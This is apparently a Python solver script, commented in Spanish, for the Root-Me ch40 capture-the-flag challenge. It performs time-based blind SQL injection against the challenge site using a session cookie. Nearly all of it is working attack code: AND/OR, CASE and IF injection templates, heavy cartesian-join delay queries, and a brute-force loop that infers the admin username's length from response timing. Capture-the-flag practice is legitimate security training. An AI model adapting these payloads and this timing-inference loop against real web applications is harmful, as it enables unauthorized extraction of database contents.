#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 20 - BÚSQUEDA COMPLETA CORREGIDA
"""
import requests
import time
import statistics
import json
from datetime import datetime

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class SQLInjectorTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.resultados = []
        self.exito = False
        
    def test_payload(self, payload, repeats=3):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def test_payload_login(self, payload, repeats=3):
        tiempos = []
        data = {"username": payload, "password": "test"}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.post(URL + "?action=login", data=data, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true_member(self, condition, heavy, technique):
        payload = technique.format(cond=condition, heavy=heavy)
        t = self.test_payload(payload, repeats=2)
        return t > self.threshold
    
    def is_true_login(self, condition, heavy, technique):
        payload = technique.format(cond=condition, heavy=heavy)
        t = self.test_payload_login(payload, repeats=2)
        return t > self.threshold
    
    def get_length(self, query, technique, heavy, injection_point):
        """Obtiene la longitud usando una técnica específica"""
        for length in range(1, 20):
            cond = f"LENGTH(({query})) = {length}"
            
            if injection_point == "member":
                if self.is_true_member(cond, heavy, technique):
                    return length
            elif injection_point == "login_username":
                if self.is_true_login(cond, heavy, technique):
                    return length
        
        return 0
    
    def test_combination(self, injection_point, technique_name, technique_template, heavy, query, expected_length):
        """Prueba una combinación específica"""
        nombre = f"{injection_point} | {technique_name[:20]} | {heavy[:30]}"
        print(f"\n  Probando: {nombre}")
        
        try:
            length = self.get_length(query, technique_template, heavy, injection_point)
            print(f"    Longitud: {length} (esperado: {expected_length})")
            
            if length == expected_length:
                print(f"    ✅ ¡ÉXITO!")
                return True, length
            else:
                return False, length
        except Exception as e:
            print(f"    ❌ Error: {e}")
            return False, 0

# EJECUCIÓN
tester = SQLInjectorTester()

print("="*70)
print("  BÚSQUEDA COMPLETA - TODOS LOS PUNTOS Y TÉCNICAS")
print("="*70)

# Configuración
query_admin = "SELECT user FROM member WHERE id=1"
expected_length = 5  # "admin" tiene 5 caracteres

# 1. Definir puntos de inyección
injection_points = [
    ("member", tester.is_true_member),
    ("login_username", tester.is_true_login),
]

# 2. Definir técnicas
techniques = [
    ("AND cortocircuito", "1 AND ({cond}) AND ({heavy})"),
    ("AND CASE", "1 AND (CASE WHEN {cond} THEN {heavy} ELSE 0 END)"),
    ("AND IF", "1 AND IF({cond}, {heavy}, 0)"),
    ("AND IF inv", "1 AND IF({cond}, 0, {heavy})"),
    ("OR cortocircuito", "1 OR ({cond}) OR ({heavy})"),
    ("OR CASE", "1 OR (CASE WHEN {cond} THEN {heavy} ELSE 0 END)"),
    ("OR IF", "1 OR IF({cond}, {heavy}, 0)"),
]

# 3. Definir heavy queries
heavies = [
    "(SELECT COUNT(*) FROM users, users T1)",
    "(SELECT COUNT(*) FROM users, users T1, users T2)",
    "(SELECT COUNT(*) FROM users, users T1, users T2, users T3)",
    "(SELECT COUNT(*) FROM member, member T1)",
    "(SELECT COUNT(*) FROM member, member T1, member T2)",
    "(SELECT COUNT(*) FROM member, member T1, member T2, member T3)",
    "(SELECT COUNT(*) FROM usuarios, usuarios T1)",
    "(SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)",
]

print(f"\n[1] Probando todas las combinaciones...")
print(f"  Puntos: {len(injection_points)}")
print(f"  Técnicas: {len(techniques)}")
print(f"  Heavy queries: {len(heavies)}")
print(f"  Total: {len(injection_points) * len(techniques) * len(heavies)} combinaciones")

encontrado = False
resultados = []

# Probar combinaciones
for ip_name, ip_func in injection_points:
    for tech_name, tech_template in techniques:
        for heavy in heavies:
            exito, length = tester.test_combination(
                ip_name, tech_name, tech_template, heavy, query_admin, expected_length
            )
            
            resultados.append({
                "punto": ip_name,
                "tecnica": tech_name,
                "heavy": heavy[:50],
                "exito": exito,
                "length": length
            })
            
            if exito:
                print(f"\n" + "="*70)
                print(f"  ✅ ¡TÉCNICA ENCONTRADA!")
                print(f"  Punto: {ip_name}")
                print(f"  Técnica: {tech_name}")
                print(f"  Heavy: {heavy}")
                print(f"  Longitud: {length}")
                print("="*70)
                encontrado = True
                break
            time.sleep(0.3)
        if encontrado:
            break
    if encontrado:
        break

# 4. Si no se encuentra, probar con diferentes queries
if not encontrado:
    print("\n[2] Probando con diferentes queries...")
    
    queries = [
        "SELECT user FROM member LIMIT 1",
        "SELECT user FROM member WHERE user='admin'",
        "SELECT user FROM member WHERE id=1",
        "SELECT user FROM member ORDER BY id LIMIT 1",
        "SELECT user FROM member WHERE id=1 LIMIT 1",
    ]
    
    for query in queries:
        print(f"\n  Probando query: {query}")
        for ip_name, ip_func in injection_points[:1]:  # Solo member
            for tech_name, tech_template in techniques[:3]:  # Solo 3 técnicas
                for heavy in heavies[:3]:  # Solo 3 heavies
                    exito, length = tester.test_combination(
                        ip_name, tech_name, tech_template, heavy, query, expected_length
                    )
                    if exito:
                        print(f"\n" + "="*70)
                        print(f"  ✅ ¡ÉXITO con query alternativa!")
                        print(f"  Query: {query}")
                        print("="*70)
                        encontrado = True
                        break
                if encontrado:
                    break
            if encontrado:
                break
        if encontrado:
            break

# 5. Resumen final
print("\n" + "="*70)
print("  RESUMEN FINAL")
print("="*70)

if encontrado:
    print("  ✅ Se encontró una técnica que funciona")
else:
    print("  ❌ No se encontró ninguna técnica que funcione")
    print("\n  Mejores resultados (longitudes más cercanas a 5):")
    mejores = sorted(resultados, key=lambda x: abs(x['length'] - 5))[:5]
    for r in mejores:
        print(f"    {r['punto']} | {r['tecnica']} | Longitud: {r['length']}")

# 6. Guardar resultados
with open("resultados_completos.json", "w") as f:
    json.dump({
        "timestamp": datetime.now().isoformat(),
        "url": URL,
        "resultados": resultados,
        "encontrado": encontrado
    }, f, indent=2)
    
print(f"\n[+] Resultados guardados en resultados_completos.json")
